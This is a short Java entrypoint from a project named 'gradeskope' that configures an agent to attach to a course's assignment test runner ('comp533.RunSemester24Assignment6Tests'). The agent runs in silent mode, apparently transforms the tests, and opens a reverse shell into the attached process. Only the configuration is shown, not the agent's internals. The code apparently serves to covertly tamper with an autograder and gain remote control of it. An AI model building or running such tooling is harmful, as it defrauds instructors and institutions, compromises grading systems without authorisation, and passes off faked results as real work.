package gradeskope;

import gradeskope.shell.RSHellTargetType;

public class Main {

  // Testing Entrypoint
  public static void main(String[] args) {
    System.out.println("Testing Entrypoint");

    AgentManager agentManager = new AgentBuilder()
        .enableSilentMode(true)
        .enableTestTransform(true)
        .setTargetProcessMatchString("comp533.RunSemester24Assignment6Tests")
        .enableReverseShell(true)
        .reverseShellTarget(RSHellTargetType.AGENT_ATTACHED_PROCESS)
        .buildAgent();

    agentManager.run();
  }
}
